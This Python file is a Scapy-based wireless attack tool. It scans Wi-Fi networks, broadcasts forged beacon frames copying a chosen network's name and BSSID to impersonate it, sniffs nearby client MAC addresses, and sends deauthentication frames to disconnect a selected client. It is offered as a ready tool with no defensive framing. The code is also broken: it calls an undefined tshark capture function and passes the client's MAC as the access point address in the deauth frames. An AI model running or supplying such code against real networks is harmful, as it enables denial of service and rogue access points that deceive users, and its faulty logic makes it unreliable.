import os
import re
import subprocess
from scapy.all import *
from scapy.layers.dot11 import *

# Check if an input MAC address is valid
def validate_mac(mac_address):
    pattern = re.compile(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$")
    return bool(pattern.match(mac_address))

# Scan Wi-Fi networks (Windows)
def scan_wifi_windows():
    networks = []
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, shell=True
        )
        lines = result.stdout.splitlines()
        ssid, bssid, signal, channel = None, None, None, None

        for line in lines:
            line = line.strip()
            if line.startswith("SSID"):
                ssid = line.split(":", 1)[1].strip()
            elif line.startswith("BSSID"):
                bssid = line.split(":", 1)[1].strip()
            elif line.startswith("Signal"):
                signal = int(line.split(":", 1)[1].strip().replace("%", ""))
            elif line.startswith("Channel"):
                channel = int(line.split(":", 1)[1].strip().split()[0])

            if ssid and bssid and signal is not None and channel is not None:
                networks.append({
                    "ssid": ssid,
                    "bssid": bssid,
                    "signal": signal,
                    "channel": channel
                })
                ssid, bssid, signal, channel = None, None, None, None
    except Exception as e:
        print(f"An error occurred during Wi-Fi scanning: {e}")
    return networks

# Scan Wi-Fi networks (Linux)
def scan_wifi_linux():
    networks = []
    try:
        result = subprocess.run(
            ["iwlist", "wlan0", "scan"],
            capture_output=True, text=True, shell=True
        )
        lines = result.stdout.splitlines()
        ssid, bssid, signal, channel = None, None, None, None

        for line in lines:
            if "ESSID" in line:
                ssid = line.split(":", 1)[1].strip().strip('"')
            elif "Address" in line:
                bssid = line.split(":", 1)[1].strip()
            elif "Signal level" in line:
                signal = int(line.split("=")[1].split()[0].strip())
            elif "Channel" in line:
                channel = int(line.split(":")[1].strip())

            if ssid and bssid and signal is not None and channel is not None:
                networks.append({
                    "ssid": ssid,
                    "bssid": bssid,
                    "signal": signal,
                    "channel": channel
                })
                ssid, bssid, signal, channel = None, None, None, None
    except Exception as e:
        print(f"An error occurred during Wi-Fi scanning: {e}")
    return networks

# Get the list of network interfaces (Windows)
def get_interfaces_windows():
    interfaces = []
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True, text=True, shell=True
        )
        lines = result.stdout.splitlines()
        for line in lines:
            line = line.strip()
            if line.startswith("Name"):
                interface_name = line.split(":", 1)[1].strip()
                interfaces.append(interface_name)
        return interfaces
    except Exception as e:
        print(f"An error occurred while retrieving interfaces: {e}")
        return []

# Get the list of network interfaces (Linux)
def get_interfaces_linux():
    try:
        result = subprocess.run(
            ["iwconfig"],
            capture_output=True, text=True, shell=True
        )
        interfaces = []
        lines = result.stdout.splitlines()
        for line in lines:
            if "IEEE 802.11" in line:
                interface_name = line.split()[0]
                interfaces.append(interface_name)
        return interfaces
    except Exception as e:
        print(f"An error occurred while retrieving interfaces: {e}")
        return []

# Send beacon frames
def send_beacon(selected_network, iface):
    try:
        dot11 = Dot11(
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=selected_network["bssid"],
            addr3=selected_network["bssid"]
        )
        beacon = Dot11Beacon(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=selected_network["ssid"].encode())
        rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96")
        dsset = Dot11Elt(ID="DSset", info=bytes([selected_network["channel"]]))

        packet = RadioTap()/dot11/beacon/essid/rates/dsset
        print("\nSending beacon frames...")
        sendp(packet, iface=iface, inter=0.1, count=1000, verbose=False)
        print("Beacon frames sent successfully.")
    except Exception as e:
        print(f"An error occurred while sending beacon frames: {e}")

# Send deauthentication frames to kick clients
def deauth_clients(bssid, iface):
    try:
        print("\nSending deauthentication frames...")
        deauth = Dot11Deauth(reason=7)
        deauth_frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/deauth
        sendp(deauth_frame, iface=iface, count=100, inter=0.1, verbose=False)
        print("Deauthentication frames sent successfully.")
    except Exception as e:
        print(f"An error occurred while sending deauthentication frames: {e}")

# Capture clients using Scapy
def capture_clients(interface, channel, timeout=15):
    clients = {}

    def packet_callback(packet):
        if packet.haslayer(Dot11):
            if packet.type == 1 and packet.subtype == 8:
                return
            if packet.addr2 and packet.haslayer(Dot11Elt):
                client_mac = packet.addr2
                if client_mac not in clients:
                    clients[client_mac] = True
                    print(f"Client detected: {client_mac}")

    try:
        print(f"\nCapturing packets on channel {channel} for {timeout} seconds...")
        sniff(iface=interface, prn=packet_callback, timeout=timeout)
    except Exception as e:
        print(f"An error occurred during client capture: {e}")
    return list(clients.keys())

# Main script
def main():
    platform = "Windows" if os.name == "nt" else "Linux"
    print(f"Detected platform: {platform}")

    print("Scanning for Wi-Fi networks...")
    if platform == "Windows":
        networks = scan_wifi_windows()
        interfaces = get_interfaces_windows()
    elif platform == "Linux":
        networks = scan_wifi_linux()
        interfaces = get_interfaces_linux()

    if not networks:
        print("No Wi-Fi networks found. Exiting.")
        return

    print("\nDetected Networks:")
    for i, network in enumerate(networks):
        print(f"{i+1}. SSID: {network['ssid']} ({network['signal']}% signal, Channel: {network['channel']})")

    try:
        network_index = int(input("Select a network to spoof (enter the number): ").strip()) - 1
        selected_network = networks[network_index]
    except (IndexError, ValueError):
        print("Invalid selection. Exiting.")
        return

    if not interfaces:
        print("No interfaces found. Exiting.")
        return

    print("\nAvailable Interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface}")

    try:
        iface_index = int(input("Select an interface to use (enter the number): ").strip()) - 1
        iface = interfaces[iface_index]
    except (IndexError, ValueError):
        print("Invalid selection. Exiting.")
        return

    send_beacon(selected_network, iface)
    capture_option = input("Capture clients with (T)shark or (S)capy? ").strip().lower()

    if capture_option == "t":
        duration = int(input("Enter the duration for Wireshark packet capture (in seconds): ").strip())
        output_file = input("Enter the name for the output file (e.g., capture.pcap): ").strip()
        capture_packets_with_tshark(iface, duration, output_file)
    elif capture_option == "s":
        clients = capture_clients(iface, selected_network["channel"])
        if clients:
            print("\nDetected Clients:")
            for i, client in enumerate(clients):
                print(f"{i+1}. MAC Address: {client}")
            try:
                client_index = int(input("Select a client to disconnect (enter the number): ").strip()) - 1
                client_mac = clients[client_index]
                deauth_clients(client_mac, iface)
            except (IndexError, ValueError):
                print("Invalid selection.")
        else:
            print("No clients found.")
    else:
        print("Invalid option. Exiting.")

if __name__ == "__main__":
    main()
